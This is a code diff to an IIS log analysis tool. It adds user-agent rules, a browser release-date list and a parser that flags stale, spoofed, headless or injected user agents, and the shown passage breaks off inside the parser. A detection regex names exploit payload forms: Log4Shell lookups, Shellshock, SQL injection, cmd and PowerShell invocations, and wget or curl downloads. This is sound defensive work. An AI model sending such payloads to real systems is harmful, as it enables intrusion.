@@ -230,7 +230,7 @@ svg.chart rect.brush { fill: rgba(43, 108, 176, .25); stroke: #2b6cb0; }
 <div id="app"><div style="padding:30px;font:14px Segoe UI">Loading IIS Log Analyzer&hellip;</div></div>
 <div id="toasts"></div>
 <script type="text/plain" data-res="rules/default-rules.json">{
-  "version": "1.1.0",
+  "version": "1.2.0",
   "notes": "Built-in rules have logic in lib/rules.js keyed by id; their thresholds come from 'params' here. Any rule with a 'match' block and an id not handled by lib/rules.js is compiled as a custom row rule (see README).",
   "rules": [
     { "id": "R-SCAN-001", "name": "High 404 volume from single public client", "category": "Reconnaissance", "severity": "medium", "scope": "aggregate", "entity": "ip",
@@ -357,6 +357,19 @@ svg.chart rect.brush { fill: rgba(43, 108, 176, .25); stroke: #2b6cb0; }
       "description": "Public client used many distinct user agents within one day, typical of credential-stuffing or scanner tooling.",
       "falsePositives": "Carrier-grade NAT and corporate proxies." },
 
+    { "id": "R-UA-001", "name": "Outdated browser user agent reaching executable handlers", "category": "Reconnaissance", "severity": "low", "scope": "aggregate", "entity": "ua",
+      "attack": ["T1595"], "enabled": true, "params": { "minAgeDays": 730, "includeEol": true, "minExecOk": 1, "maxIps": 20 },
+      "description": "A browser user agent whose version was at least minAgeDays old when it was first seen (or a browser past its end of support, such as Internet Explorer), used by no more than maxIps clients, received 2xx responses from executable handlers for public clients. Attack tools and scripts often hard-code an old browser string. Release dates come from lists\\browser-releases.txt.",
+      "falsePositives": "Unmanaged or embedded clients (kiosks, scanners, line-of-business applications) that are never updated; check the clients and their behaviour." },
+    { "id": "R-UA-002", "name": "Spoofed, malformed or automation user agent", "category": "Defense Evasion", "severity": "low", "scope": "aggregate", "entity": "ua",
+      "attack": ["T1036"], "enabled": true, "params": { "flags": ["impossible", "malformed", "headless"], "escalateOnExecOk": true },
+      "description": "User agent used by public clients that cannot exist (browser version not released yet, not available for the stated Windows version, or a Windows version that does not exist), is malformed, or names a headless browser or automation tool. Escalates to medium when public clients received 2xx responses from executable handlers with it.",
+      "falsePositives": "Privacy tools and extensions that randomise the user agent; monitoring that uses headless browsers; home-grown clients with a hand-written user agent." },
+    { "id": "R-UA-003", "name": "Exploit payload in the user agent", "category": "Exploitation", "severity": "medium", "scope": "row", "entity": "row",
+      "attack": ["T1190"], "enabled": true, "params": {},
+      "description": "The user agent carries an exploit payload: Log4Shell lookups (${jndi:...}), Shellshock (() { :; };), OGNL, script tags, SQL or shell injection. The response status says little here: such payloads target logging and back-end components and often act out of band.",
+      "falsePositives": "Security scanners run by the organisation." },
+
     { "id": "R-EXF-001", "name": "Archive / database / document downloaded by public client", "category": "Exfiltration", "severity": "medium", "scope": "row", "entity": "row",
       "attack": ["T1005", "T1041"], "enabled": true, "params": {},
       "description": "Public client received 200 for an archive, backup, database, mailbox, office or config file outside public download directories. High for .bak/.mdf/.sql/.config/.pst-class extensions.",
@@ -427,6 +440,8 @@ svg.chart rect.brush { fill: rgba(43, 108, 176, .25); stroke: #2b6cb0; }
   "displayTzLabel": "UTC",
   "businessHours": { "start": "08:00", "end": "19:00", "days": [1, 2, 3, 4, 5] },
   "sessionIdleMinutes": 30,
+  "uaStaleDays": 365,
+  "uaRareIps": 1,
   "hashOnScan": true,
   "indexCaps": { "ips": 250000, "stems": 500000, "uas": 100000 },
   "ruleHitRetention": 20000,
@@ -1115,7 +1130,7 @@ namespace IISLA
     }
     public sealed class StemInfo { public string key, dec, ext, dir, b; public bool decErr, exec, stat, ws005, sens, probe, exPath, trav, cmdi, exp001, shellName, upDir, dlEp, loginEp, pubDl, exf, exfHigh, lng, dotnetProbe, axd, svc, php, dotnet; }
     public sealed class QueryInfo { public bool empty, decErr, exp001, trav, cmdi, phpinfo, shellParam, highEnt, lng, versionOnly, hasD, wsdl; public string dec, lower; public int len, sqli; public double ent = double.NaN; }
-    public sealed class UaInfo { public string dec, fam; public bool scanner, shellUa, empty; }
+    public sealed class UaInfo { public string dec, fam; public bool scanner, shellUa, empty, inject; }
 
     public sealed class Deriver
     {
@@ -1134,7 +1149,7 @@ namespace IISLA
         }
         HashSet<string> execExt, staticExt, ws005Ext, exfExt, exfHigh; List<string> probeExt;
         Matcher sens, scanUa, loginEp, exPath, upDirs, dlEp, pubDl, shellName, shellParam, dotnetProbe;
-        Regex reTrav, reExp001, reSqliHigh, reSqliMed, reCmdi, rePhpinfo, reVersionOnly, reHasD, reWsdl, reAxd, reSvc, reShellUa, rePhp, reDotnet;
+        Regex reTrav, reExp001, reSqliHigh, reSqliMed, reCmdi, rePhpinfo, reVersionOnly, reHasD, reWsdl, reAxd, reSvc, reShellUa, reUaInject, rePhp, reDotnet;
         List<KeyValuePair<string, Regex>> uaFamilies = new List<KeyValuePair<string, Regex>>();
         Dictionary<string, StemInfo> sc = new Dictionary<string, StemInfo>(StringComparer.Ordinal);
         Dictionary<string, QueryInfo> qc = new Dictionary<string, QueryInfo>(StringComparer.Ordinal);
@@ -1174,7 +1189,7 @@ namespace IISLA
             dotnetProbe = Matcher.Build(L(lists, "dotnet-probe-paths", null));
             reTrav = R(res, "trav"); reExp001 = R(res, "exp001"); reSqliHigh = R(res, "sqliHigh"); reSqliMed = R(res, "sqliMed"); reCmdi = R(res, "cmdi");
             rePhpinfo = R(res, "phpinfo"); reVersionOnly = R(res, "versionOnly"); reHasD = R(res, "hasD"); reWsdl = R(res, "wsdl"); reAxd = R(res, "axd");
-            reSvc = R(res, "svc"); reShellUa = R(res, "shellUa"); rePhp = R(res, "php"); reDotnet = R(res, "dotnet");
+            reSvc = R(res, "svc"); reShellUa = R(res, "shellUa"); reUaInject = R(res, "uaInject"); rePhp = R(res, "php"); reDotnet = R(res, "dotnet");
             foreach (object o in uaFam) { var a = (List<object>)o; string src = (string)a[1]; uaFamilies.Add(new KeyValuePair<string, Regex>((string)a[0], JsRegex.Make(src, ((string)a[2]).IndexOf('i') >= 0 && JsRegex.HasUpperLiteral(src)))); }
         }
         bool EndsWithAny(string s) { foreach (var p in probeExt) if (s.EndsWith(p, StringComparison.Ordinal)) return true; return false; }
@@ -1219,7 +1234,7 @@ namespace IISLA
             bool scanner = TM("m.scanUa", scanUa, dl), shell = T("shellUa", reShellUa, dl); string fam = "other";
             if (dec.Length == 0) fam = "empty"; else if (shell) fam = "webshell-client"; else if (scanner) fam = "scanner";
             else foreach (var f in uaFamilies) if (T("uafam:" + f.Key, f.Value, dl)) { fam = f.Key; break; }
-            v = new UaInfo { dec = dec, fam = fam, scanner = scanner, shellUa = shell, empty = dec.Length == 0 };
+            v = new UaInfo { dec = dec, fam = fam, scanner = scanner, shellUa = shell, empty = dec.Length == 0, inject = dec.Length > 0 && T("uaInject", reUaInject, dl) };
             uc[raw] = v; return v;
         }
         public string IpClass(string ip)
@@ -1515,6 +1530,7 @@ namespace IISLA
                         return c => (c.pub && st.Contains(c.r.Status)) || (w32.Contains(c.r.Win32) && c.r.Method == "POST" && c.si.exec) ? T : null;
                     }
                 case "R-WS-004": return c => c.si.shellName || c.qi.shellParam || c.ui.shellUa ? T : null;
+                case "R-UA-003": return c => c.ui.inject ? T : null;
                 case "R-WS-005": return c => c.si.ws005 && c.pub && c.r.Status == 200 && (c.r.Method == "POST" || (!c.qi.empty && !c.qi.versionOnly)) ? T : null;
                 case "R-AUTH-003":
                     {
@@ -1648,7 +1664,7 @@ namespace IISLA
         public OMap<double> m = new OMap<double>(), st = new OMap<double>(), ua = new OMap<double>(), d = new OMap<double>(), hits = new OMap<double>(), off = new OMap<double>();
     }
     public sealed class StemRec { public double n, first, last, fFile, fLine, ipOv, pubN, post, ok, okPub, s4, s5; public int ipN; public string fIp, raw; public bool exec, upDir; public OMap<double> ips = new OMap<double>(), sts = new OMap<double>(); }
-    public sealed class UaRec { public double n, first, last, ipOv; public int ipN; public string fam; public OMap<double> ips = new OMap<double>(); }
+    public sealed class UaRec { public double n, first, last, fFile, fLine, ipOv, pubN, s2, s3, s4, s5, post, exec, xok, hits; public int ipN; public string fam, fIp; public OMap<double> ips = new OMap<double>(); }
     public sealed class UserRec { public double n, first, last, fFile, fLine, pub; public int ipN; public OMap<double> ips = new OMap<double>(); }
     public sealed class RuleHit { public double n, first, last; public string sev; public List<object[]> kept = new List<object[]>(); public OMap<double> ips = new OMap<double>(), stems = new OMap<double>(); public int ipN, stN; public double[] sx = new double[5]; }
     public sealed class EnumRec { public int n; public HashSet<string> q = new HashSet<string>(StringComparer.Ordinal); }
@@ -2006,10 +2022,14 @@ namespace IISLA
             if (!uas.TryGet(ua, out u))
             {
                 if (cUas >= uaCap && cUas >= evAtUas) EvictUas();
-                u = new UaRec { first = t, last = t, fam = ui.fam }; uas[ua] = u; cUas++;
+                u = new UaRec { first = t, last = t, fFile = r.fileId, fLine = r.lineNo, fIp = ip, fam = ui.fam }; uas[ua] = u; cUas++;
             }
-            u.n++; if (t > u.last) u.last = t; if (t < u.first) u.first = t;
-            if (!u.ips.Has(ip)) { if (u.ipN < 20) { u.ips[ip] = 1; u.ipN++; } else u.ipOv = 1; }
+            u.n++; if (t > u.last) u.last = t; if (t < u.first) { u.first = t; u.fFile = r.fileId; u.fLine = r.lineNo; u.fIp = ip; }
+            if (!u.ips.Has(ip)) { if (u.ipN < 20) { u.ips[ip] = 1; u.ipN++; if (pub) u.pubN++; } else u.ipOv = 1; }
+            if (scl == 2) u.s2++; else if (scl == 3) u.s3++; else if (scl == 4) u.s4++; else if (scl == 5) u.s5++;
+            if (isPost) u.post++;
+            if (si.exec) { u.exec++; if (scl == 2 && pub) u.xok++; }
+            if (nh > 0) u.hits++;
 
             // users
             string user = r.User;
@@ -2133,7 +2153,7 @@ namespace IISLA
             double thr = 1, removed = 0;
             while (cUas >= uaCap * 0.9 && thr < 1000)
             {
-                foreach (var k in uas.Keys()) { if (uas[k].n <= thr) { uas.Remove(k); cUas--; removed++; } }
+                foreach (var k in uas.Keys()) { if (uas[k].n <= thr && uas[k].hits == 0) { uas.Remove(k); cUas--; removed++; } }
                 thr *= 2;
             }
             uaEvicted += removed;
@@ -2201,7 +2221,12 @@ namespace IISLA
                 }
                 j.EndObj();
                 j.Key("uas").ObjStart();
-                foreach (var k in uas.Keys()) { var u = uas[k]; j.Key(k).ObjStart().KNum("n", u.n).KNum("first", u.first).KNum("last", u.last); MapNum(j, "ips", u.ips); j.KNum("ipN", u.ipN).KNum("ipOv", u.ipOv).KStr("fam", u.fam).EndObj(); }
+                foreach (var k in uas.Keys())
+                {
+                    var u = uas[k]; j.Key(k).ObjStart().KNum("n", u.n).KNum("first", u.first).KNum("last", u.last).KNum("fFile", u.fFile).KNum("fLine", u.fLine).KStr("fIp", u.fIp);
+                    MapNum(j, "ips", u.ips); j.KNum("ipN", u.ipN).KNum("ipOv", u.ipOv).KNum("pubN", u.pubN).KStr("fam", u.fam)
+                     .KNum("s2", u.s2).KNum("s3", u.s3).KNum("s4", u.s4).KNum("s5", u.s5).KNum("post", u.post).KNum("exec", u.exec).KNum("xok", u.xok).KNum("hits", u.hits).EndObj();
+                }
                 j.EndObj();
                 j.Key("users").ObjStart();
                 foreach (var k in users.Keys()) { var u = users[k]; j.Key(k).ObjStart().KNum("n", u.n).KNum("first", u.first).KNum("last", u.last).KNum("fFile", u.fFile).KNum("fLine", u.fLine); MapNum(j, "ips", u.ips); j.KNum("ipN", u.ipN).KNum("pub", u.pub).EndObj(); }
@@ -2265,6 +2290,174 @@ try {
   Write-Error $msg
   exit 1
 }
+</script>
+<script type="text/plain" data-res="lists/browser-releases.txt"># Browser release dates, used to judge how old a user agent's browser version was when the request was made
+# (User agents view, the uaage: and uaflag: filters, rules R-UA-001 and R-UA-002).
+#
+#   <engine> <major> <YYYY-MM-DD>    first stable release of that major version
+#   cadence <engine> <days>          days per major version after the last listed one (extrapolation)
+#   eol <engine> <YYYY-MM-DD> [max]  end of support, for majors up to [max] (all majors when omitted)
+#
+# Engines: chrome (the Chrome/ token: Chrome, Edge 79+, Opera 15+, Brave, Vivaldi, Samsung Internet, Yandex, CriOS),
+# firefox (Firefox/, and FxiOS/ from 100), safari (the Version/ token of Safari), ie (MSIE / Trident), edgehtml (Edge/12-18),
+# presto (Opera 12 and older).
+# Versions between two listed ones are interpolated. Versions after the last listed one are extrapolated with the cadence,
+# so add the newest releases from time to time (an extrapolated date is shown with "~"). Restart the HTA after editing.
+
+chrome 1 2008-12-11
+chrome 2 2009-05-24
+chrome 3 2009-10-12
+chrome 4 2010-01-25
+chrome 5 2010-05-25
+chrome 6 2010-09-02
+chrome 8 2010-12-02
+chrome 10 2011-03-08
+chrome 12 2011-06-07
+chrome 14 2011-09-16
+chrome 16 2011-12-13
+chrome 18 2012-03-28
+chrome 20 2012-06-26
+chrome 22 2012-09-25
+chrome 24 2013-01-10
+chrome 26 2013-03-26
+chrome 28 2013-07-09
+chrome 30 2013-10-01
+chrome 32 2014-01-14
+chrome 34 2014-04-08
+chrome 36 2014-07-16
+chrome 38 2014-10-07
+chrome 40 2015-01-21
+chrome 42 2015-04-14
+chrome 44 2015-07-21
+chrome 46 2015-10-13
+chrome 48 2016-01-20
+chrome 49 2016-03-02
+chrome 50 2016-04-13
+chrome 52 2016-07-20
+chrome 54 2016-10-12
+chrome 56 2017-01-25
+chrome 58 2017-04-19
+chrome 60 2017-07-25
+chrome 62 2017-10-17
+chrome 64 2018-01-24
+chrome 66 2018-04-17
+chrome 68 2018-07-24
+chrome 70 2018-10-16
+chrome 72 2019-01-29
+chrome 74 2019-04-23
+chrome 76 2019-07-30
+chrome 78 2019-10-22
+chrome 80 2020-02-04
+chrome 81 2020-04-07
+chrome 83 2020-05-19
+chrome 84 2020-07-14
+chrome 86 2020-10-06
+chrome 88 2021-01-19
+chrome 90 2021-04-14
+chrome 92 2021-07-20
+chrome 94 2021-09-21
+chrome 96 2021-11-15
+chrome 98 2022-02-01
+chrome 100 2022-03-29
+chrome 102 2022-05-24
+chrome 104 2022-08-02
+chrome 106 2022-09-27
+chrome 108 2022-11-29
+chrome 109 2023-01-10
+chrome 110 2023-02-07
+chrome 112 2023-04-04
+chrome 114 2023-05-30
+chrome 116 2023-08-15
+chrome 118 2023-10-10
+chrome 120 2023-12-05
+chrome 122 2024-02-20
+chrome 124 2024-04-16
+chrome 126 2024-06-11
+chrome 128 2024-08-20
+chrome 130 2024-10-15
+chrome 132 2025-01-14
+chrome 134 2025-03-04
+chrome 136 2025-04-29
+chrome 138 2025-06-24
+chrome 140 2025-09-02
+cadence chrome 31
+
+firefox 1 2004-11-09
+firefox 2 2006-10-24
+firefox 3 2008-06-17
+firefox 4 2011-03-22
+firefox 5 2011-06-21
+firefox 10 2012-01-31
+firefox 15 2012-08-28
+firefox 20 2013-04-02
+firefox 25 2013-10-29
+firefox 30 2014-06-10
+firefox 35 2015-01-13
+firefox 40 2015-08-11
+firefox 45 2016-03-08
+firefox 50 2016-11-15
+firefox 52 2017-03-07
+firefox 55 2017-08-08
+firefox 60 2018-05-09
+firefox 65 2019-01-29
+firefox 70 2019-10-22
+firefox 75 2020-04-07
+firefox 80 2020-08-25
+firefox 85 2021-01-26
+firefox 90 2021-07-13
+firefox 95 2021-12-07
+firefox 100 2022-05-03
+firefox 105 2022-09-20
+firefox 110 2023-02-14
+firefox 115 2023-07-04
+firefox 120 2023-11-21
+firefox 125 2024-04-16
+firefox 128 2024-07-09
+firefox 130 2024-09-03
+firefox 135 2025-02-04
+firefox 140 2025-06-24
+firefox 143 2025-09-16
+cadence firefox 29
+
+safari 3 2007-10-26
+safari 4 2009-06-08
+safari 5 2010-06-07
+safari 6 2012-07-25
+safari 7 2013-10-22
+safari 8 2014-10-16
+safari 9 2015-09-30
+safari 10 2016-09-20
+safari 11 2017-09-19
+safari 12 2018-09-17
+safari 13 2019-09-19
+safari 14 2020-09-16
+safari 15 2021-09-20
+safari 16 2022-09-12
+safari 17 2023-09-18
+safari 18 2024-09-16
+safari 26 2025-09-15
+cadence safari 365
+
+ie 5 1999-03-18
+ie 6 2001-08-27
+ie 7 2006-10-18
+ie 8 2009-03-19
+ie 9 2011-03-14
+ie 10 2012-10-26
+ie 11 2013-10-17
+
+edgehtml 12 2015-07-29
+edgehtml 13 2015-11-12
+edgehtml 14 2016-08-02
+edgehtml 15 2017-04-11
+edgehtml 16 2017-10-17
+edgehtml 17 2018-04-30
+edgehtml 18 2018-11-13
+
+eol ie 2016-01-12 10
+eol ie 2022-06-15 11
+eol edgehtml 2021-03-09
+eol presto 2016-02-16
 </script>
 <script type="text/plain" data-res="lists/dotnet-probe-paths.txt"># .NET / IIS probe paths (R-EXP-005)
 re:\.rem$
@@ -2664,7 +2857,7 @@ var IISLA = IISLA || {};
   'use strict';
   var U = NS.util = {};
 
-  NS.VERSION = '1.3.3';
+  NS.VERSION = '1.4.0';
   NS.bootWarnings = NS.bootWarnings || [];
   /* Debug trace to %TEMP%\iisla-trace.log (enabled with /trace on the command line or always during autotest). */
   NS.traceOn = false;
@@ -4020,6 +4213,9 @@ var IISLA = IISLA || {};
     axd: /\/(?:webresource|scriptresource)\.axd$/i,
     svc: /\.(?:asmx|svc)$/i,
     shellUa: /antsword|godzilla|behinder|weevely|china ?chopper|altman|cknife|b374k|^java\/[\d.]+$/i,
+    // Exploit payloads carried in the user agent: Log4Shell lookups, Shellshock, OGNL, script, SQL and shell injection.
+    // Written in lower case: the fast engine applies it to the lower-cased string without IgnoreCase.
+    uaInject: /\$\{(?:(?:jndi|env|sys|lower|upper|date|java|base64|main|ctx)[:}\-]|::-)|\(\)\s*\{\s*[:_]?\s*;\s*\}|%\{\(#|\$\{\(#|<script|javascript:|\bunion\b[\s\/*]+(?:all[\s\/*]+)?select\b|\bwaitfor\s+delay\b|\bsleep\s*\(\s*\d|\bxp_cmdshell\b|'\s*(?:or|and)\s+['\d]|\/etc\/passwd|\bcmd(?:\.exe)?\s+\/c\b|\bpowershell(?:\.exe)?\s+-|\b(?:wget|curl)\s+(?:-\S+\s+)*https?:|\$\(\s*\w|`[^`]{2,80}`|\bnslookup\s+\S|\bping\s+-[cn]\b/i,
     php: /\.(?:php\d?|phtml|cgi|pl)$/i,
     dotnet: /\.(?:aspx|ashx|asmx|axd|svc|asp|cshtml|rem|soap)$/i
   };
@@ -4111,7 +4307,7 @@ var IISLA = IISLA || {};
     if (!dec) { fam = 'empty'; } else if (shell) { fam = 'webshell-client'; } else if (scanner) { fam = 'scanner'; } else {
       for (i = 0; i < UA_FAMILIES.length; i++) { if (UA_FAMILIES[i][1].test(dec)) { fam = UA_FAMILIES[i][0]; break; } }
     }
-    v = { dec: dec, fam: fam, scanner: scanner, shellUa: shell, empty: !dec };
+    v = { dec: dec, fam: fam, scanner: scanner, shellUa: shell, empty: !dec, inject: !!dec && RE.uaInject.test(dec) };
     this.uc[raw] = v;
     return v;
   };
@@ -4125,6 +4321,242 @@ var IISLA = IISLA || {};
   };
   P.UA_FAMILIES = UA_FAMILIES;
   P.UA_FAMILY_NAMES = ['edge', 'chrome', 'firefox', 'safari', 'ie', 'opera', 'mobile-app', 'bot', 'library', 'scanner', 'webshell-client', 'empty', 'other'];
+}(IISLA));
+
+</script>
+<script>/* lib/useragent.js */
+/* IIS Log Analyzer - useragent.js
+ * User-agent analysis: browser and version, operating system, how old the browser version was when the request was
+ * made, end of support, combinations that cannot exist (spoofed strings), malformed strings, injection payloads and
+ * automation tools. Release dates come from lists\browser-releases.txt. Everything is derived from the user-agent
+ * string and the request time, so both scan engines share it: the index keeps per-user-agent counts and this module
+ * classifies each distinct string when a view, a filter or an aggregate rule asks for it.
+ */
+(function (NS) {
+  'use strict';
+  var U = NS.util, P = NS.parser, UA = NS.useragent = {};
+  var DAY = 86400000;
+
+  UA.FLAGS = ['stale', 'eol', 'eol-os', 'impossible', 'malformed', 'inject', 'headless', 'rare'];
+  UA.FLAG_HELP = {
+    stale: 'browser version older than the stale threshold when the request was made',
+    eol: 'browser past its end of support when the request was made (Internet Explorer, EdgeHTML Edge, Presto Opera)',
+    'eol-os': 'operating system past its end of support when the request was made (Windows XP, Vista, 7, 8, 8.1 ...)',
+    impossible: 'a combination that never existed: browser version not released yet, or not available for that Windows version, or a Windows version that does not exist',
+    malformed: 'unbalanced brackets, control characters, a misspelt or odd Mozilla token, a Chrome version not in four-part form, or an unusually long string',
+    inject: 'exploit payload in the user agent (Log4Shell, Shellshock, OGNL, script, SQL or shell injection)',
+    headless: 'headless browser or browser automation (HeadlessChrome, PhantomJS, Selenium, Puppeteer, Playwright ...)',
+    rare: 'seen from no more than the configured number of clients, at least one of them public'
+  };
+  UA.cfg = { staleDays: 365, rareIps: 1, futureDays: 120 };
+  UA.gen = 1; // bumped when thresholds or tables change, invalidating the results cached by UA.atDay
+  UA.configure = function (settings) {
+    if (!settings) { return; }
+    if (settings.uaStaleDays > 0) { UA.cfg.staleDays = +settings.uaStaleDays; }
+    if (settings.uaRareIps > 0) { UA.cfg.rareIps = +settings.uaRareIps; }
+    UA.gen++;
+  };
+
+  /* ---------- release table ---------- */
+  var REL = U.newMap(), CAD = U.newMap(), EOL = U.newMap(), cache = U.newMap(), cacheN = 0;
+  UA.loaded = false;
+  function dateMs(s) { var m = /^(\d{4})-(\d{2})-(\d{2})$/.exec(s || ''); return m ? Date.UTC(+m[1], +m[2] - 1, +m[3]) : NaN; }
+  /* lines: the parsed lines of lists\browser-releases.txt */
+  UA.init = function (lines) {
+    REL = U.newMap(); CAD = U.newMap(); EOL = U.newMap(); cache = U.newMap(); cacheN = 0;
+    var i, p, ms, e;
+    for (i = 0; i < (lines || []).length; i++) {
+      p = U.trim(lines[i]).split(/\s+/);
+      if (p[0] === 'cadence' && p.length >= 3 && +p[2] > 0) { CAD[p[1].toLowerCase()] = +p[2] * DAY; continue; }
+      if (p[0] === 'eol' && p.length >= 3) { ms = dateMs(p[2]); if (!isNaN(ms)) { e = p[1].toLowerCase(); (EOL[e] || (EOL[e] = [])).push([p.length > 3 ? +p[3] : Infinity, ms]); } continue; }
+      if (p.length >= 3 && /^\d+$/.test(p[1])) { ms = dateMs(p[2]); if (!isNaN(ms)) { e = p[0].toLowerCase(); (REL[e] || (REL[e] = [])).push([+p[1], ms]); } }
+    }
+    for (e in REL) { REL[e].sort(function (a, b) { return a[0] - b[0]; }); }
+    for (e in EOL) { EOL[e].sort(function (a, b) { return a[0] - b[0]; }); }
+    UA.loaded = true; UA.gen++;
+  };
+  /* Release date of a major version: { ms, est } with est 0 listed, 1 interpolated (or older than the first listed
+   * version: its date is then a lower bound on the age), 2 extrapolated with the cadence. Null without a table. */
+  UA.release = function (engine, major) {
+    var t = REL[engine], i, a, b, cad;
+    if (!t || !t.length || !(major >= 0)) { return null; }
+    if (major <= t[0][0]) { return { ms: t[0][1], est: major === t[0][0] ? 0 : 1 }; }
+    for (i = 1; i < t.length; i++) {
+      if (major <= t[i][0]) {
+        a = t[i - 1]; b = t[i];
+        if (major === b[0]) { return { ms: b[1], est: 0 }; }
+        return { ms: Math.round(a[1] + (b[1] - a[1]) * (major - a[0]) / (b[0] - a[0])), est: 1 };
+      }
+    }
+    a = t[t.length - 1];
+    cad = CAD[engine] || (t.length > 1 ? (a[1] - t[t.length - 2][1]) / (a[0] - t[t.length - 2][0]) : 365 * DAY);
+    return { ms: Math.round(a[1] + (major - a[0]) * cad), est: 2 };
+  };
+  function eolOf(engine, major) {
+    var t = EOL[engine], i;
+    if (!t) { return 0; }
+    for (i = 0; i < t.length; i++) { if (!(major >= 0) || major <= t[i][0]) { return t[i][1]; } }
+    return 0;
+  }
+
+  /* ---------- parsing ---------- */
+  // Windows NT versions (client editions; end of support dates of the client release)
+  var NT = {
+    '4.0': ['Windows NT 4.0', '2004-06-30'], '5.0': ['Windows 2000', '2010-07-13'], '5.01': ['Windows 2000', '2010-07-13'],
+    '5.1': ['Windows XP', '2014-04-08'], '5.2': ['Windows XP x64 / Server 2003', '2015-07-14'], '6.0': ['Windows Vista', '2017-04-11'],
+    '6.1': ['Windows 7', '2020-01-14'], '6.2': ['Windows 8', '2016-01-12'], '6.3': ['Windows 8.1', '2023-01-10'],
+    '6.4': ['Windows 10 preview', ''], '10.0': ['Windows 10 / 11', '']
+  };
+  var NAMES = { chrome: 'Chrome', edge: 'Edge', opera: 'Opera', samsung: 'Samsung Internet', yandex: 'Yandex Browser', 'headless-chrome': 'Headless Chrome',
+    firefox: 'Firefox', safari: 'Safari', ie: 'Internet Explorer', 'edge-legacy': 'Edge (EdgeHTML)', 'opera-presto': 'Opera (Presto)', office: 'Microsoft Office',
+    'android-browser': 'Android browser' };
+  UA.NAMES = NAMES;
+  var RX = {
+    office: /\bms-office\b|\bmsoffice\b|microsoft (?:office|outlook)|\boutlook-/i,
+    trident: /\bTrident\/(\d+)/, msie: /\bMSIE (\d+)/,
+    edgeHtml: /\bEdge\/(\d+)/,
+    chromium: /\b(HeadlessChrome|Chrome|CriOS|Chromium)\/(\d+)(\S*)/,
+    edg: /\bEdg(?:A|iOS)?\/\d/, opr: /\bOPR\/\d/, samsung: /\bSamsungBrowser\/\d/, yandex: /\bYaBrowser\/\d/,
+    firefox: /\b(Firefox|FxiOS)\/(\d+)/,
+    safari: /\bVersion\/(\d+)[\d.]*(?: Mobile\/\S+)? Safari\//,
+    presto: /\bPresto\/|^Opera\/\d/,
+    nt: /\bWindows NT (\d+\.\d+)/, winPhone: /\bWindows Phone(?: OS)? \d/, win9x: /\bWindows (?:95|98|ME)\b|\bWin(?:95|98)\b|\bWin 9x\b/,
+    ios: /\b(?:iPhone|CPU) OS (\d+)_/, android: /\bAndroid (\d+)(?:\.(\d+))?/, cros: /\bCrOS\b/, mac: /\bMac OS X (\d+)(?:[_.](\d+))?/, linux: /\bLinux\b/,
+    headless: /headlesschrome|phantomjs|slimerjs|selenium|webdriver|puppeteer|playwright|htmlunit|\bsplash\/|cypress/i,
+    mozilla: /^Mozilla\/(\S*)/, mozTypo: /^(?:mozila|mozzila|mozzilla|mozlla|mozilia|mozill\/)/i, mozParen: /^Mozilla\/[\d.]+\(/,
+    ctrl: /[\u0000-\u001f\u007f]/
+  };
+  function parenOk(s) {
+    var d = 0, i, c;
+    for (i = 0; i < s.length; i++) { c = s.charAt(i); if (c === '(') { d++; } else if (c === ')') { if (--d < 0) { return false; } } }
+    return d === 0;
+  }
+  function between(v, lo, hi) { return v >= lo && v <= hi; }
+
+  /* Static facts about a decoded user agent (cached). Fields: browser, name, engine, major, ver, os, osEol (ms or 0),
+   * rel ({ms, est} or null), bEol (ms or 0), stat ({flag: reason} for impossible, malformed, inject, headless). */
+  UA.info = function (dec) {
+    dec = dec || '';
+    var v = cache[dec];
+    if (v) { return v; }
+    if (cacheN++ > 100000) { cache = U.newMap(); cacheN = 0; }
+    v = parse(dec);
+    cache[dec] = v;
+    return v;
+  };
+  function parse(dec) {
+    var o = { browser: '', name: '', engine: '', major: -1, ver: '', os: '', osEol: 0, rel: null, bEol: 0, stat: {} }, m, nt = -1, ntv = '', ieReal = -1, msieOnly = false;
+    if (!dec) { return o; }
+    // operating system
+    if ((m = RX.nt.exec(dec))) {
+      ntv = m[1]; nt = parseFloat(ntv);
+      if (NT[ntv]) { o.os = NT[ntv][0]; o.osEol = NT[ntv][1] ? dateMs(NT[ntv][1]) : 0; } else { o.os = 'Windows NT ' + ntv; o.stat.impossible = 'Windows NT ' + ntv + ' does not exist'; }
+    } else if (RX.winPhone.test(dec)) { o.os = 'Windows Phone'; o.osEol = dateMs('2019-12-10'); }
+    else if (RX.win9x.test(dec)) { o.os = 'Windows 9x / ME'; o.osEol = dateMs('2006-07-11'); }
+    else if ((m = RX.ios.exec(dec))) { o.os = 'iOS ' + m[1]; }
+    else if ((m = RX.android.exec(dec))) { o.os = 'Android ' + m[1] + (m[2] !== undefined && m[2] !== '' ? '.' + m[2] : ''); }
+    else if (RX.cros.test(dec)) { o.os = 'ChromeOS'; }
+    else if ((m = RX.mac.exec(dec))) { o.os = 'macOS ' + m[1] + (m[2] !== undefined && m[2] !== '' ? '.' + m[2] : ''); }
+    else if (RX.linux.test(dec)) { o.os = 'Linux'; }
+    // browser and engine
+    var tri = RX.trident.exec(dec), ie = RX.msie.exec(dec), eh, ch, ff, sa;
+    if (RX.office.test(dec)) { o.browser = 'office'; }
+    else if ((eh = RX.edgeHtml.exec(dec))) { o.browser = 'edge-legacy'; o.engine = 'edgehtml'; o.major = +eh[1]; } // also sends a Chrome/ token
+    else if (tri || ie) {
+      ieReal = tri ? +tri[1] + 4 : +ie[1]; msieOnly = !tri;
+      o.browser = 'ie'; o.engine = 'ie'; o.major = ieReal;
+    }
+    else if ((ch = RX.chromium.exec(dec))) {
+      o.engine = 'chrome'; o.major = +ch[2]; o.ver = ch[2] + ch[3];
+      o.browser = RX.edg.test(dec) ? 'edge' : RX.opr.test(dec) ? 'opera' : RX.samsung.test(dec) ? 'samsung' : RX.yandex.test(dec) ? 'yandex' : ch[1] === 'HeadlessChrome' ? 'headless-chrome' : 'chrome';
+      if (ch[1] !== 'Chromium' && !/^\.\d+\.\d+\.\d+$/.test(ch[3])) { o.stat.malformed = ch[1] + '/' + ch[2] + ch[3] + ' is not the four-part version browsers send'; }
+    }
+    else if ((ff = RX.firefox.exec(dec))) {
+      o.browser = 'firefox'; o.major = +ff[2];
+      if (ff[1] === 'Firefox' || o.major >= 100) { o.engine = 'firefox'; } // Firefox for iOS used its own numbering before 100
+    }
+    else if (RX.presto.test(dec)) { o.browser = 'opera-presto'; o.engine = 'presto'; }
+    else if ((sa = RX.safari.exec(dec))) {
+      if (RX.android.test(dec)) { o.browser = 'android-browser'; } else { o.browser = 'safari'; o.engine = 'safari'; o.major = +sa[1]; }
+    }
+    if (o.browser) { o.name = NAMES[o.browser] + (o.major >= 0 ? ' ' + o.major : ''); }
